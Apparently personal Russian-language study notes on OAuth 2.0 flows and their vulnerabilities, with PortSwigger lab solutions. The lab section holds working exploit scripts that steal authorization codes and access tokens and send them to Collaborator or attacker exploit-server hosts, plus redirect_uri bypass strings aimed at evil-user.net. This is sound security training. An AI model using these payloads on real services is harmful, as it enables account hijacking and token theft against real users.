## Что такое OAuth?

OAuth 2.0 — это **протокол делегированного доступа**, позволяющий приложениям получать ограниченный доступ к защищенным ресурсам пользователя без раскрытия его учетных данных.

>[!note] **Определение:** 
>Это **фреймворк авторизации**, а не аутентификации. Его цель — позволить приложению получать **ограниченный доступ** к ресурсам пользователя на другом сервисе, без раскрытия пароля пользователя.

**Как применяется:** Классический пример — "Войти через Facebook". Вы даёте стороннему приложению (например, Spotify) разрешение получить доступ к вашему списку друзей в Facebook или к вашему профилю. OAuth 2.0 управляет этим процессом делегирования прав. Пользователь аутентифицируется напрямую в Facebook (ресурсный сервер), который затем выдаёт приложению Spotify **токен доступа (Access Token)**. Spotify использует этот токен для вызова API Facebook от вашего имени.

> **Примечание**
>
> Хотя современным стандартом является OAuth 2.0, некоторые сайты всё ещё используют устаревшую версию 1a. OAuth 2.0 была написана с нуля, а не разработана напрямую на базе OAuth 1.0. В результате они сильно отличаются. Обратите внимание, что термин «OAuth» в этих материалах относится исключительно к OAuth 2.0.

---

# Как работает OAuth 2.0?

OAuth 2.0 изначально был разработан как способ совместного доступа к конкретным данным между приложениями. Он определяет серию взаимодействий между тремя сторонами: клиентским приложением, владельцем ресурса и провайдером OAuth.

- **Клиентское приложение** — сайт или веб-приложение, которое хочет получить доступ к данным пользователя.
- **Владелец ресурса** — пользователь, к данным которого клиентское приложение хочет получить доступ.
- **Провайдер услуг OAuth** — сайт или приложение, которое контролирует данные пользователя и доступ к ним. Они поддерживают OAuth, предоставляя API для взаимодействия как с сервером авторизации, так и с сервером ресурсов.

Существует множество различных способов реализации самого процесса OAuth. Они известны как OAuth «потоки (flows)» или «[[OAuth 2.0#Типы грантов (grant types) OAuth|grant types]]». Самыми распространёнными являются типах грантов: «authorization code» и «implicit». В широком смысле, оба типа грантов включают следующие этапы:

1. Клиентское приложение запрашивает доступ к подмножеству данных пользователя, указывая, какой тип гранта он хочет использовать и какой именно доступ.
2. Пользователю предлагается войти в сервис OAuth и явно дать согласие на запрошенный доступ.
3. Клиентское приложение получает уникальный токен доступа, подтверждающий, что у него есть разрешение пользователя на доступ к запрашиваемым данным. Точный способ этого процесса значительно зависит от типа гранта.
4. Клиентское приложение использует этот токен доступа для создания API-запросов, которые получают соответствующие данные с сервера ресурсов.

---

### Что такое тип гранта OAuth?

Тип гранта OAuth определяет точную последовательность шагов в процессе OAuth. Тип гранта также влияет на то, как клиентское приложение взаимодействует с сервисом OAuth на каждом этапе, включая передачу самого токена доступа. По этой причине типы грантов часто называют «потоками OAuth».

Сервис OAuth должен быть настроен для поддержки определённого типа гранта, прежде чем клиентское приложение сможет инициировать соответствующий поток. Клиентское приложение указывает, какой тип гранта оно хочет использовать в первоначальном запросе авторизации, отправляемом сервису OAuth.

Существует несколько различных типов грантов, каждый из которых имеет разный уровень сложности и соображений по вопросам безопасности. Мы сосредоточимся на типах «authorization code» и «implicit», так как они самые распространённые.

---
### OAuth scopes

Для любого типа гранта OAuth клиентское приложение должно указать, к каким данным оно хочет получить доступ и какие операции выполнять. Он делает это с помощью параметра `scope` запроса авторизации, который отправляется сервису OAuth. 

Базово, OAuth области (scopes), для которых клиентское приложение может запросить доступ, уникальны для каждого сервиса OAuth. Поскольку название области — это просто произвольная текстовая строка, формат может значительно различаться между поставщиками. Некоторые даже используют полноценный URI в качестве названия области, аналогично REST API endpoint. Например, при запросе доступа для чтения списка контактов пользователя имя области может принимать одну из следующих форм в зависимости от используемого сервиса OAuth:

```uri
scope=contacts
scope=contacts.read
scope=contact-list-r
scope=https://oauth-authorization-server.com/auth/scopes/user/contacts.readonly
```

Однако при использовании OAuth для аутентификации часто применяются стандартизированные области OpenID Connect. Например, область `openid profile` будет предоставлять клиентскому приложению доступ к заранее определённому набору базовой информации о пользователе, такой как его адрес электронной почты, имя пользователя и так далее. Подробнее о [[OAuth 2.0#OpenID Connect|OpenID Connect]] мы поговорим позже. 

---

## Тип гранта: Authorization code

Клиентское приложение и сервис OAuth сначала используют перенаправления для обмена серией браузерных HTTP-запросов, которые запускают этот поток. 
1. Пользователя спрашивают, согласен ли он с запрошенным доступом. 
2. Если он согласен, заявке клиента выдается «код авторизации». 
3. Клиентское приложение затем обменивается этим кодом с сервисом OAuth, чтобы получить «токен доступа», который можно использовать для вызовов API для получения соответствующих пользовательских данных.

Вся коммуникация, которая происходит после обмена кодом/токеном, отправляется от сервера к серверу по безопасному, предварительно настроенному обратному каналу и, следовательно, невидима для конечного пользователя. Этот безопасный канал устанавливается, когда клиентское приложение впервые регистрируется в службе OAuth. В это время также генерируется `client_secret`, который клиентское приложение должно использовать для аутентификации при отправке этих запросов от сервера к серверу.

Поскольку наиболее конфиденциальные данные (токен доступа и данные пользователя) не отправляются через браузер, этот тип предоставления прав, пожалуй, является самым безопасным. Серверные приложения в идеале должны всегда использовать этот тип предоставления прав, если это возможно.

![[Pasted image 20260131194819.png]]

---

#### 1. Запрос на авторизацию

Клиентское приложение отправляет запрос на конечную точку `/authorization` сервиса OAuth с просьбой получить разрешение на доступ к конкретным данным пользователей. Обратите внимание, что отображение конечных точек может различаться у разных поставщиков — лаборатории PortSwigger используют конечную точку `/auth` для этой цели. Однако вы всегда должны иметь возможность определить конечную точку по параметрам, использованным в запросе. 

```http
GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=code&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1 
Host: oauth-authorization-server.com
```

Этот запрос обычно содержит следующие примечательные параметры:

1. `client_id`
   
   > Обязательный параметр, содержащий уникальный идентификатор клиентского приложения. Это значение генерируется, когда клиентское приложение регистрируется в сервисе OAuth.
   > 
1. `redirect_uri`
   
   > URI, на который следует перенаправлять браузер пользователя при отправке кода авторизации клиентскому приложению. Это также известно как «callback URI» или «callback endpoint». Многие атаки на OAuth основаны на использовании недостатков в валидации этого параметра.
   > 
1. `response_type`
   
   > Определяет, какой тип гранта ожидает клиентское приложение и, следовательно, какой поток оно хочет инициировать. Для типа выдачи гранта "Authorization code" значение должно быть `code`. 
   > 
1. `scope`
   
   > Используется для указания, к какому подмножеству данных пользователя клиентское приложение хочет получить доступ. Обратите внимание, что это могут быть пользовательские области, заданные провайдером OAuth, или стандартизированные области, определённые спецификацией [[OAuth 2.0#OpenID Connect|OpenID Connect]].
   > 
1. `state`
   
   > Сохраняет уникальное, непредсказуемое значение, привязанное к текущей сессии в клиентском приложении. Сервис OAuth должен вернуть это же значение в ответе вместе с кодом авторизации. Этот параметр служит формой CSRF-токена для клиентского приложения, гарантируя, что запрос к конечной точке `/callback` исходит от того же человека, который инициировал поток OAuth. 

---

#### 2. Вход пользователя и согласие

Когда сервер авторизации получает первоначальный запрос, он перенаправляет пользователя на страницу входа, где ему будет предложено войти в свой аккаунт у провайдера OAuth. Например, это часто их аккаунт в социальных сетях.

Затем пользователю будет представлен список данных, к которым клиентское приложение хочет получить доступ. Это основано на параметре `scope`, определённом в запросе авторизации. Пользователь может выбрать, давать согласие на этот доступ или нет.

Важно отметить, что после того как пользователь одобрил определённый `scope` для клиентского приложения, этот шаг будет выполняться автоматически, если у пользователя осталась действительная сессия с сервисом OAuth. Другими словами, при первом выборе «Войти с помощью социальных сетей» пользователь должен войти вручную и дать согласие, но если позже он снова зайдёт в клиентское приложение, он часто сможет войти в систему одним кликом.

---

#### 3. Выдача кода авторизации

Если пользователь даёт согласие на запрошенный доступ, его браузер будет перенаправлен на конечную точку `/callback`, указанную в параметре `redirect_uri` запроса авторизации. В результате этот `GET` запрос будет содержать код авторизации в качестве query параметра. В зависимости от конфигурации, параметр `state` может также передаваться с тем же значением, что и в запросе авторизации. 

```http
GET /callback?code=a1b2c3d4e5f6g7h8&state=ae13d489bd00e3c24 HTTP/1.1 
Host: client-app.com
```

---

#### 4. Запрос токена доступа

После того как клиентское приложение получает код авторизации, ему необходимо обменять его на токен доступа. Для этого он отправляет server-to-server `POST` запрос на конечную точку `/token` сервиса OAuth. Вся коммуникация с этого момента происходит в защищённом бэк-канале и, следовательно, обычно не может быть замечена или контролироваться злоумышленниками. 

```http
POST /token HTTP/1.1 
Host: oauth-authorization-server.com 
… 
client_id=12345&client_secret=SECRET&redirect_uri=https://client-app.com/callback&grant_type=authorization_code&code=a1b2c3d4e5f6g7h8
```

Помимо `client_id` и `code` для авторизации, вы заметите следующие новые параметры: 

1. `client_secret`

> Клиентское приложение должно использовать `client_secret` для аутентификации, включив секретный ключ, назначенный ему при регистрации в сервисе OAuth.
> 
2. `grant_type`

> Использовался для того, чтобы новый конечный узел знал, какой тип гранта хочет использовать клиентское приложение. В этом случае `grant_type` должен быть установлен на `authorization_code`. 

---

#### 5. Предоставление токенов доступа

Сервис OAuth проверит запрос на токен доступа. Если всё соответствует ожиданиям, сервер ответит, предоставляя клиентскому приложению токен доступа с запрошенной областью действий.

```json
{
	"access_token": "z0y9x8w7v6u5",
	"token_type": "Bearer",
	"expires_in": 3600,
	"scope": "openid profile",
	…
}
```

---

#### 6. Вызов API

Теперь, когда клиентское приложение имеет код доступа, оно наконец может получать данные пользователя с сервера ресурсов. Для этого он совершает вызов API на конечную точку `/userinfo` сервиса OAuth. Токен доступа вводится в заголовок `Authorization: Bearer`, чтобы доказать, что клиентское приложение имеет разрешение на доступ к этим данным. 

```http
GET /userinfo HTTP/1.1 
Host: oauth-resource-server.com 
Authorization: Bearer z0y9x8w7v6u5
```

---

#### 7. Грант ресурсов

Сервер ресурсов должен проверить, что токен валиден и принадлежит текущему клиентскому приложению. Если да, то он ответит, отправив запрошенный ресурс, то есть данные пользователя, исходя из объёма токена доступа.

```json
{
	"username":"carlos",
	"email":"carlos@carlos-montoya.net",
	…
}
```

Клиентское приложение наконец может использовать эти данные по назначению. В случае аутентификации OAuth она обычно используется как идентификатор для получения аутентифицированной сессии, фактически входя в систему.

---

## Тип гранта: Implicit (неявный)

Неявный тип гранта гораздо проще. Вместо того чтобы сначала получить код авторизации и затем обменять его на токен доступа, клиентское приложение получает токен доступа сразу после согласия пользователя.

Возможно, вы задаётесь вопросом, почему клиентские приложения не всегда используют неявный тип гранта. Ответ относительно прост — это гораздо менее безопасно. При использовании неявного гранта вся коммуникация происходит через перенаправления браузера — нет защищённого обратного канала, как в потоке авторизационного кода. Это означает, что чувствительный токен доступа и данные пользователя более подвержены потенциальным атакам.

Неявный тип гранта больше подходит для одностраничных приложений и нативных настольных приложений, которые не могут хранить `client_secret` на сервере и, следовательно, не получают больших преимуществ от использования типа "Authorization code". 

![[Pasted image 20260131202051.png]]

---

#### 1. Запрос на авторизацию

Неявный поток начинается примерно так же, как и поток авторизационного кода. Единственное существенное отличие в том, что параметр `response_type` должен быть установлен в `token`. 

```http
GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=token&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1 
Host: oauth-authorization-server.com
```

---

#### 2. Вход пользователя и согласие

Пользователь входит в систему и решает, давать ли согласие на запрошенные разрешения или нет. Этот процесс точно такой же, как и для потока авторизационного кода.

---

#### 3. Предоставление токена доступа

Если пользователь дает согласие на запрошенный доступ, здесь начинаются различия. Сервис OAuth перенаправит браузер пользователя на `redirect_uri`, указанный в запросе на авторизацию. Однако вместо отправки query-параметра, содержащего код авторизации, он отправит токен доступа и другие данные, относящиеся к токену, в виде фрагмента URL.

```http
GET /callback#access_token=z0y9x8w7v6u5&token_type=Bearer&expires_in=5000&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1 
Host: client-app.com
```

Поскольку токен доступа отправляется в виде фрагмента URL, он никогда не отправляется напрямую в клиентское приложение. Вместо этого клиентское приложение должно использовать подходящий скрипт для извлечения фрагмента и его сохранения.

---

#### 4. Вызов API

После того как клиентское приложение успешно извлекло токен доступа из фрагмента URL, оно может использовать его для вызовов API на конечную точку `/userinfo` сервиса OAuth. В отличие от потока кода авторизации, это также происходит через браузер. 

```http
GET /userinfo HTTP/1.1 
Host: oauth-resource-server.com
Authorization: Bearer z0y9x8w7v6u5
```

---

#### 5. Грант ресурсов

Сервер ресурсов должен проверить, что токен валиден и принадлежит текущему клиентскому приложению. Если да, то он ответит, отправив запрошенный ресурс, то есть данные пользователя на основе `scope`, связанного с токеном доступа.

```json
{
	"username":"carlos",
	"email":"carlos@carlos-montoya.net"
}
```

Клиентское приложение наконец может использовать эти данные по назначению. В случае аутентификации OAuth она обычно используется как идентификатор для получения аутентифицированной сессии, фактически входя в систему.

---

## OAuth аутентификация

Хотя изначально OAuth не предназначался для этой цели, он также превратился в средство аутентификации пользователей. 

Для механизмов аутентификации OAuth базовые потоки OAuth в основном остаются прежними; Главное отличие — в том, как клиентское приложение использует полученные данные. С точки зрения конечного пользователя, результат аутентификации OAuth в целом напоминает систему единого входа (SSO) на основе SAML. В этих материалах мы сосредоточимся исключительно на уязвимостях в этом похожем на SSO сценарий.

Аутентификация OAuth обычно реализуется следующим образом:

1. Пользователь выбирает опцию входа через свой аккаунт в соцсетях. Клиентское приложение затем использует сервис OAuth социальной сети для запроса доступа к некоторым данным, которые можно использовать для идентификации пользователя. Например, это может быть адрес электронной почты, зарегистрированный в их аккаунте.
2. После получения токена доступа клиентское приложение запрашивает эти данные у сервера ресурсов, обычно с выделенной конечной точки `/userinfo`. 
3. После получения данных клиентское приложение использует их вместо имени пользователя для входа пользователя. Токен доступа, полученный от сервера авторизации, часто используется вместо традиционного пароля.

---

## Разведка используемого сервиса OAuth

Базовая разведка используемого сервиса OAuth может направить вас в правильном направлении при выявлении уязвимостей.

Само собой разумеется, что вам стоит изучить различные HTTP-взаимодействия, составляющие поток OAuth. Если используется внешний сервис OAuth, вы должны иметь возможность определить конкретного провайдера по имени хоста, куда отправляется запрос на авторизацию. Поскольку эти сервисы предоставляют публичный API, часто доступна подробная документация, которая должна дать вам всестороннюю полезную информацию, например, точные названия конечных устройств и используемые настройки.

Когда вы знаете имя хоста сервера авторизации, всегда пытайтесь отправить `GET` запрос на следующие стандартные конечные точки: 

- `/.well-known/oauth-authorization-server`
- `/.well-known/openid-configuration`

Они часто возвращают конфигурационный файл JSON, содержащий ключевую информацию, например, детали дополнительных функций, которые могут поддерживаться. Иногда это подсказывает о более широкой поверхности атаки и поддерживаемых функциях, которые могут не упомянуть в документации.

---

# Эксплуатация уязвимостей аутентификации OAuth

Уязвимости могут возникать как в реализации OAuth клиентским приложением, так и в самой конфигурации сервиса OAuth.

---

#### 1. Неправильная реализация Implicit (неявного) гранта

Из-за опасностей, связанных с отправкой токенов доступа через браузер, Implicit грант в основном рекомендуется для одностраничных приложений. Однако он также часто используется в классических клиент-серверных веб-приложениях из-за своей относительной простоты.

В Implicit потоке токен доступа отправляется из службы OAuth в клиентское приложение через браузер пользователя в виде query-параметра. Затем клиентское приложение получает доступ к токену с помощью JavaScript. Проблема заключается в том, что если приложение хочет сохранить сессию после закрытия страницы пользователем, ему необходимо где-то сохранить текущие данные пользователя (обычно это идентификатор пользователя и токен доступа).

Чтобы решить эту проблему, клиентское приложение часто отправляет полученные из OAuth данные на сервер в `POST`-запросе, а затем назначает пользователю сессионный файл cookie, фактически регистрируя его. Этот запрос примерно эквивалентен запросу на отправку формы в рамках классического входа в систему на основе пароля. Однако в этом сценарии сервер не имеет никаких секретных данных или паролей для сравнения с отправленными данными. 

>[!note] 
> Если клиентское приложение не проверяет должным образом, что токен доступа соответствует другим данным в запросе, то злоумышленник может изменить часть этих данных, например, имя или почту, чтобы привязать изменённые данные к своему токену доступа и выдать себя за другого пользователя.

Лаба: [[OAuth 2.0#Лабораторные#Lab Authentication bypass via OAuth implicit flow|Authentication bypass via OAuth implicit flow]].

---

#### 2. Недостаточная защита от CSRF

Хотя многие компоненты потоков OAuth являются опциональными, некоторые из них настоятельно рекомендуется использовать, если нет веских причин для отказа от них. Одним из таких компонентов является параметр `state`.

В идеале параметр `state` должен содержать непредсказуемое значение, такое как хеш чего-либо, связанного с сессией пользователя при первом запуске потока OAuth. Затем это значение передается между клиентским приложением и службой OAuth в виде токена CSRF для клиентского приложения. Поэтому, если вы заметили, что запрос на авторизацию не отправляет параметр `state`, это чрезвычайно интересно с точки зрения злоумышленника. Это потенциально означает, что он может инициировать поток OAuth самостоятельно, прежде чем обманом заставить браузер пользователя завершить его, подобно традиционной атаке CSRF. Это может иметь серьезные последствия в зависимости от того, как OAuth используется клиентским приложением.

Рассмотрим веб-сайт, который позволяет пользователям входить в систему с помощью классического механизма на основе пароля или путем привязки своей учетной записи к профилю в социальной сети с помощью OAuth. В этом случае, если приложение не использует параметр `state`, злоумышленник может потенциально захватить учетную запись пользователя-жертвы в клиентском приложении, привязав ее к своей учетной записи в социальной сети.

Лаба: [[OAuth 2.0#Lab Forced OAuth profile linking|Forced OAuth profile linking]]

---

#### 3. Утечка кодов авторизации и токенов доступа.

Пожалуй, самой известной уязвимостью OAuth является ситуация, когда конфигурация самого сервиса OAuth позволяет злоумышленникам похищать коды авторизации или токены доступа, связанные с учетными записями других пользователей. Похитив действительный код или токен, злоумышленник может получить доступ к данным жертвы. В конечном итоге это может привести к полной компрометации ее учетной записи — злоумышленник может потенциально войти в систему под именем жертвы в любом клиентском приложении, зарегистрированном в этом сервисе OAuth.

В зависимости от типа гранта код или токен отправляется через браузер жертвы на конечную точку `/callback`, указанную в параметре `redirect_uri` запроса на авторизацию. Если служба OAuth не может правильно проверить этот URI, злоумышленник может организовать атаку типа CSRF, обманув браузер жертвы и заставив его инициировать поток OAuth, который отправит код или токен на контролируемый злоумышленником `redirect_uri`.

В случае потока "кода авторизации" злоумышленник может потенциально украсть код жертвы до его использования. Затем он может отправить этот код на законную конечную точку `/callback` клиентского приложения (исходный `redirect_uri`), чтобы получить доступ к учетной записи пользователя. В этом сценарии злоумышленнику даже не нужно знать секретный ключ клиента или полученный токен доступа. Если у жертвы есть действующая сессия в службе OAuth, клиентское приложение просто выполнит обмен кодом/токеном от имени злоумышленника, а затем войдет в учетную запись жертвы.

Обратите внимание, что использование `state` или `nonce` защиты не всегда предотвращает такие атаки, поскольку злоумышленник может генерировать новые значения из своего браузера.

Лаба: [[#Lab OAuth account hijacking via redirect_uri|OAuth account hijacking via redirect_uri]]

Более безопасные серверы авторизации потребуют отправки параметра `redirect_uri` также при обмене кодом доступа. Затем сервер может проверить, соответствует ли он тому, который он получил в первоначальном запросе на авторизацию, и в случае несоответствия отклонить обмен. Поскольку это происходит в запросах между серверами через безопасный обратный канал, злоумышленник не может контролировать этот второй параметр `redirect_uri`.

---

#### 4. Недостаточная проверка redirect_uri.

В связи с видами атак, рассмотренными в предыдущем лабораторном задании, для клиентских приложений рекомендуется предоставлять белый список своих подлинных URI обратного вызова при регистрации в службе OAuth. Таким образом, когда служба OAuth получает новый запрос, она может проверить параметр `redirect_uri` по этому белому списку. В этом случае предоставление внешнего URI, скорее всего, приведет к ошибке. Однако все еще могут существовать способы обойти эту проверку.

При аудите потока OAuth следует поэкспериментировать с параметром `redirect_uri`, чтобы понять, как он проверяется. Например:

- Некоторые реализации допускают диапазон подкаталогов, проверяя только то, что строка начинается с правильной последовательности символов, т. е. с утвержденного домена. Следует попробовать удалить или добавить произвольные пути, параметры запроса и фрагменты, чтобы увидеть, что можно изменить, не вызывая ошибку.
- Если вы можете добавить дополнительные значения к параметру `redirect_uri` по умолчанию, вы сможете воспользоваться несоответствиями между разбором URI различными компонентами службы OAuth. Например, вы можете попробовать такие методы, как:
  > ```
  > https://default-host.com &@foo.evil-user.net#@bar.evil-user.net/
  > ```
  > Если вы не знакомы с этими методами, рекомендуется ознакомиться с материалами о том, как обойти распространенные средства защиты от SSRF и CORS.
- Иногда вы можете столкнуться с уязвимостями, связанными с загрязнением параметров на стороне сервера (server-side parameter pollution). На всякий случай попробуйте отправить дубликаты параметров redirect_uri следующим образом:
  > ```
  > https://oauth-authorization-server.com/?client_id=123&redirect_uri=client-app.com/callback&redirect_uri=evil-user.net
  > ```
- Некоторые серверы также предоставляют специальные условия для URI localhost, поскольку они часто используются во время разработки. В некоторых случаях любой URI перенаправления, начинающийся с localhost, может быть случайно разрешен в производственной среде. Это может позволить вам обойти проверку, зарегистрировав доменное имя, такое как localhost.evil-user.net.

Важно отметить, что не следует ограничивать тестирование только проверкой параметра `redirect_uri` в отдельности. В реальных условиях часто приходится экспериментировать с различными комбинациями изменений нескольких параметров. Иногда изменение одного параметра может повлиять на проверку других. Например, изменение `response_mode` с `query` на `fragment` иногда может полностью изменить разбор `redirect_uri`, позволяя вам отправлять URI, которые в противном случае были бы заблокированы. Аналогично, если вы заметили, что поддерживается режим ответа `web_message`, это часто позволяет использовать более широкий диапазон поддоменов в `redirect_uri`.

---

#### 5. Кража кодов и токенов доступа через прокси-страницу

Против более защищённых целей вы можете обнаружить, что, несмотря на все попытки, вам не удается успешно отправить внешний домен в качестве `redirect_uri`. Однако это не значит, что пора сдаваться.

К этому моменту вы должны уже достаточно хорошо понимать, какие части URI можно подделать. Теперь главное — использовать эти знания, чтобы попытаться получить доступ к более широкой поверхности атаки внутри самого клиентского приложения. Другими словами, попробуйте выяснить, можно ли изменить параметр `redirect_uri`, чтобы он указывал на любые другие страницы в домене, включенном в белый список.

Попробуйте найти способы, с помощью которых вы сможете успешно получить доступ к разным поддоменам или путям. Например, URI по умолчанию часто находится на пути, специфичном для OAuth, таком как `/oauth/callback`, который вряд ли будет иметь какие-либо интересные подкаталоги. Однако вы можете использовать приемы перебора каталогов, чтобы указать любой произвольный путь в домене. Пример:
> ```
> https://client-app.com/oauth/callback/../../example/path
> ```
>   Может быть интерпретировано на бэкэнде как:  
>   ```
>   https://client-app.com/example/path
>   ```

После того, как вы определили, какие другие страницы можно установить в качестве URI перенаправления, вам следует проверить их на наличие дополнительных уязвимостей, которые можно потенциально использовать для утечки кода или токена. Для потока "авторизационного кода" вам необходимо найти уязвимость, которая дает вам доступ к параметрам запроса, тогда как для "неявного" гранта вам необходимо извлечь фрагмент URL.

Одной из наиболее полезных уязвимостей для этой цели является open redirect. Вы можете использовать его в качестве прокси для перенаправления жертв вместе с их кодом или токеном на домен, контролируемый злоумышленником, где вы можете разместить любой вредоносный скрипт.

Обратите внимание, что для неявного гранта кража токена доступа не только позволяет вам войти в учетную запись жертвы в клиентском приложении. Поскольку весь неявный поток происходит через браузер, вы также можете использовать токен для выполнения собственных вызовов API к серверу ресурсов службы OAuth. Это может позволить вам получить конфиденциальные данные пользователя, к которым вы обычно не можете получить доступ из веб-интерфейса клиентского приложения.

Лабораторная: [[#Lab Stealing OAuth access tokens via an open redirect|Stealing OAuth access tokens via an open redirect]]



---

# OpenID Connect

---

# Лабораторные

---

## Lab: Authentication bypass via OAuth implicit flow

https://portswigger.net/web-security/oauth/lab-oauth-authentication-bypass-via-oauth-implicit-flow

1. Изучим запросы потока авторизации OAuth, начиная с `GET /auth?client_id=[...]`;
2. Клиентское приложение (блог-сайт) получает базовую информацию о пользователе от сервиса OAuth. Затем пользователь входит в систему, отправляя `POST` запрос с этой информацией на его конечную точку `/authenticate` вместе с токеном доступа;
3. С помощью **Intercept** на финальном шаге авторизации в запросе 
   > ```http
   > POST /authenticate HTTP/2
   > Host: YOUR-LAB-ID.web-security-academy.net
   > Content-Type: application/json
   > 
   > {"email":"wiener@hotdog.com","username":"wiener","token":"65NzlN6foVJmqVEBU2ru7UaFVe4nIe3QI-q2OYyArDB"}
   > ```
   > Изменим:
   > 1. `email` на `carlos@carlos-montoya.net`;
   > 2. `username` на `carlos`.
   
---

## Lab: Forced OAuth profile linking

https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking

> [!info]
> В этой лабораторной по алгоритму гранта **"Authorization code"** для привязки двух аккаунтов:
> 1. Проходит авторизацию первый пользователь (вы - `peter.wiener:hotdog`), но на этапе [[#3. Выдача кода авторизации]] код авторизации получает другой пользователь, когда OAuth сервер перенаправляет его обратно на сайт приложения с параметром `code` (authorization code) на URI `/oauth-linking`.
>    >`code` — одноразовый токен авторизации `peter.wiener:hotdog`, который клиент (`carlos`) должен обменять на токены доступа.
>
> 2. Далее [[#4. Запрос токена доступа]]. Здесь клиентское приложение продолжает связывать социальный профиль `peter.wiener` с учётной записью `carlos` и **не проверяет, откуда пришёл этот запрос** из-за отсутствия `state`.

**Решение:**

В лабораторной имеется функционал привязки профиля социальной сети к основному профилю. Для этого используется OAuth. **Проблема в том, что отсутствует защита от CSRF (нет параметра `state`) в запросе на привязку профиля**, поэтому злоумышленник может заставить другого пользователя (victim/admin) выполнить OAuth-flow с **кодом, контролируемым атакующим**, и привязать свой собственный OAuth-профиль к аккаунту жертвы.

1. В истории запросов изучите серию OAuth запросов на добавление соц. профиля. В запросе `GET /auth?client_id[...]` обратите внимание, что `redirect_uri` отправляет код авторизации в `/oauth-linking`;
2. Начните привязывать профиль, но с помощью Intercept пропускайте запросы, пока не перехватите `GET /oauth-linking?code=[...]`. Кликните правой кнопкой мыши по этому запросу и выберите «copy URL». 
3. Откажитесь от запроса. Это важно для того, чтобы код не использовался и, следовательно, оставался действительным. Отключите перехват прокси и выйдите из блога.
4. Зайдите на сервер эксплойтов и создайте `window.location` на только что скопированный вами URL. Результат должен выглядеть примерно так: 
   > ```html
   > <script>
   > 	window.location="https://YOUR-LAB-ID.web-security-academy.net/oauth-linking?code=STOLEN-CODE"
   > </script>
   > ```
5. Доставьте эксплойт жертве.
6. Вернитесь на сайт блога и снова выберите опцию «Войти в социальные сети». Обратите внимание, что вы сразу входите в систему как администратор. Зайдите в панель администратора и удалите `carlos`, чтобы решить лабораторию.

---

## Lab: OAuth account hijacking via redirect_uri

https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri

1. Создаём нагрузку с поддельным `redirect_uri`:
   ```html
   <script>
window.location="https://oauth-YOUR-OAUTH-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-COLLABORATOR-ID.oastify.com&response_type=code&scope=openid%20profile%20email"
</script>
   ```
2. Получаем код доступа через перехваченный код авторизации: 
   ```
   https://{YOUR-LAB-ID}.web-security-academy.net/oauth-callback?code={AUTH-CODE}
   ```

---

## Lab: Stealing OAuth access tokens via an open redirect

https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect

**Исследование:**
1. OAuth использует Implicit грант: `response_type=token`;
2. Данные пользователя запрашиваются по следующей API точке:
   > ```http
   > GET /me HTTP/2
Host: oauth-YOUR-OAUTH-ID.oauth-server.net
Authorization: Bearer YOUR-BEARER-TOKEN
   > ```
   > Ответ:
   > ```json
   > {
   > 	"sub":"wiener",
   > 	"apikey":"orVpAFxSKoJbEMkZ68buTEUy2JZsmAa7",
   > 	"name":"Peter Wiener",
   > 	"email":"wiener@hotdog.com",
   > 	"email_verified":true
   > }
   > ```
   
3. В запросе `GET /auth?client_id=...` в параметре `redirect_uri` нельзя изменить основную страницу, но можно дописывать путь, например с помощью `/../../` или `../post?postId=1`, при чём токен доступа будет включен в запрос как hash-параметр:
   
   ![[Pasted image 20260202171948.png]]
4. Кнопка "Next post" имеет открытое перенаправление в параметре `path`. Используем её путь: `GET /post/next?path=...`.

**Атака:**

Необходимо собрать эксплойт, работающий в 2 шага: 
1. Первичный заход пользователя - начало OAuth рукопожатия, которое в конце редиректит на эксплойт сервер, передавая токен доступа. Но передача происходит как hash параметр, поэтому, чтобы увидеть его в логах, его нужно извлекать с помощью JS.
2. Извлечение hash параметров (при наличии) и сохранение их в логи. 

Соответственно подходит конструкция: 
``` html
<script> 
	if (!document.location.hash) {
		window.location = 'https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email' 
	} else { 
	window.location = '/logs?'+document.location.hash.substr(1) 
	} 
</script>
```

3. Подставляем полученный токен доступа в API `GET /me`. 